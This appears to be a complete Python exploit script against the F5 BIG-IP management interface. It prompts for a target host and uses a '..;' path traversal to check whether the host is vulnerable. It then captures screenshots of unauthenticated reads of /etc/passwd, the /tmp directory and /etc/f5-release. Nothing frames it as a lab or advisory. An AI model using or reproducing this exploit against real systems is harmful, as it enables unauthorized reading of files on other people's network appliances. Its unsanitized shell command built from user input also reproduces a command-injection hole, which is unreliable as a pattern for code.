#!/usr/bin/python3
import os
import requests
import urllib3
import imgkit

host= input( "Enter the host Domain/IP:")
cmd = "curl -sk 'https://"+host+"/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=Vulnerable' | grep -q Vulnerable && printf '\033[0;31mVulnerable\n' || printf '\033[0;32mNot Vulnerable\n'"
a = os.system(cmd)



imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd","etc_password.jpg")
imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp","directory.jpg")
imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release","F5-realase.jpg")
